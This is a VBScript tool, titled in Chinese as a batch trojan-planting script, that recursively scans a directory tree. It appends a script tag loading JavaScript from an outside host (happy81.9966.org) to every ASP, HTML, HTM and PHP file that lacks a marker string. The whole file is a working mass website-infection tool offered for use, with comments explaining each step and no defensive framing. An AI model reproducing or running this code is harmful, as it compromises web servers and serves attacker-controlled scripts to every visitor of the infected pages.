br="************************************" & vbCrLf
br=br & "*        VBS 批量挂马脚本          *" & vbCrLf
br=br & "*           BY BanLG               *" & vbCrLf
br=br & "************************************" & vbCrLf & vbCrLf
br=br & "cscript scan.vbe D:\" & vbCrLf
gjz="9966.org"
ma="<script src=http://happy81.9966.org/hxw/e.js></script>"
MyString="asp|html|htm|php"
MyArray = Split(MyString, "|", -1, 1)
web=WScript.Arguments(0)
if web="" then
  Wscript.echo (br)
  window.Close
end if
Wscript.echo (br) & "马的地址：" & ma & vbCrLf & vbCrLf
Set fso = createObject("Scripting.FileSystemObject")
scan(web)
sub scan(filesder) 
set filesder=fso.getfolder(filesder)
set files=filesder.files 
for each fext in files
  Set file1 = fso.GetFile(fext)
  filesext=file1.Name
  '把文件名转换成小写字母
  ext=fso.GetExtensionName(fext) 
    For Each index in MyArray
'判断文件是不是我们在MyString里限定的文件，如果是就写马
     yyy=""
     if ext=lcase(index) then
      if fso.GetFile(fext).size<>0 then
        set rr=fso.opentextfile(fext)
        yyy=rr.readall
        rr.Close
      end if
      if not instr(yyy,gjz)>0 then
       Set ts = fso.OpenTextFile(fext,8) '打开文件并在文件末尾进行写操作
       ts.WriteLine(ma)
       ts.Close
       echo=""
       echo=fext & "   .............ok"
       Wscript.echo (echo)
      end if
     end if
    next
next
set subfolders=filesder.subfolders
  for each subfolder in subfolders '搜索其他目录,递归调用
     scan(subfolder)
  next 
end sub